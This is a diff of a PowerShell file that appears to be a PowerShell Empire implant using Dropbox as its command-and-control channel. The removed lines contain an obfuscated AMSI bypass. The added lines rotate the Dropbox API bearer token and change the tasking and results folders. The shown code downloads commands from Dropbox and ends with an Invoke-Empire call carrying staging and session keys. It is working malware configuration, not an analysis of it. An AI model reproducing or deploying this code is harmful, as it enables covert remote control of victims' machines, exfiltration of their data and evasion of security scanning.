@@ -1,11 +1,4 @@
-${W} = ('Syst'+'em.'+'Managem'+'ent.Autom'+'atio'+'n.A');${c} = 'si';${M} = ('Util'+'s')
-${A`S`SeMBly} = [Ref]."aSS`EMbLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${C},${m}))
-${fI`eld} = ${a`ssE`M`BlY}.('GetFiel'+'d').Invoke(('am{0}InitFailed' -f ${C}),('N'+'o'+'nPubli'+'c,Stat'+'i'+'c'))
-${f`i`ELd}.('Se'+'tV'+'alue').Invoke(${nU`Ll},${tr`Ue})
-
-echo "hello"
-
-$Script:APIToken = "sl.B6Sjq3a2oMRT4YkFdIfMumRrfcASJBjPBH3KsiUxZCHS-Csw8RdZGcYGyTtPbCRJtYPzuEs2q5JXBqtpmwzoT_Pgi6CE9FhxGRdWqc3QpSbtKlfH_eQWmm55EyPHZFS4ofwiY7lG6IsB";
+$Script:APIToken = "sl.B6Rw8-zCaq4KslryCHkXOjMMni6mq7xDAnTrmJEQ0x9aW4Q5_QS0Tg3nmaFUXi5DkDkTDJj1bU_5u-q5nEMImZZUp4ll_xvTR2sVNbWUrcNpMHBPZ_lXqAwNUTCDWhEIR8-J0mDmJfVA";
 
 $Script:GetTask = {
         try {
@@ -22,7 +15,7 @@ $Script:GetTask = {
             $wc.Headers.Add("User-Agent", $Script:UserAgent);
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
 
-            $TaskingsFolder = '/filmes/atividades';
+            $TaskingsFolder = '/filmes2/atividades2';
             $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
             $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
             $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
@@ -68,7 +61,7 @@ $Script:SendMessage = {
         $wc.Headers.Add('User-Agent', $Script:UserAgent);
         $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
 
-        $ResultsFolder = '/filmes/pontuacao';
+        $ResultsFolder = '/filmes2/pontuacao2';
 
         try
         {
@@ -1019,4 +1012,4 @@ function Invoke-Empire {
     }
 }
 
-Invoke-Empire -Servers @('') -StagingKey 'ddd55e431c266fe6cc8ee989a84dfe1c' -SessionKey 'a#OWtHkzei&4-u.D(;nmF:8hN!3U]`J2' -SessionID 'P5MVOWBV' -WorkingHours '' -KillDate '';
+Invoke-Empire -Servers @('') -StagingKey 'ddd55e431c266fe6cc8ee989a84dfe1c' -SessionKey '=r6e;N<gMV.]Z_lPw!7&{L1vHjX^InQt' -SessionID '1OG4MWSC' -WorkingHours '' -KillDate '';
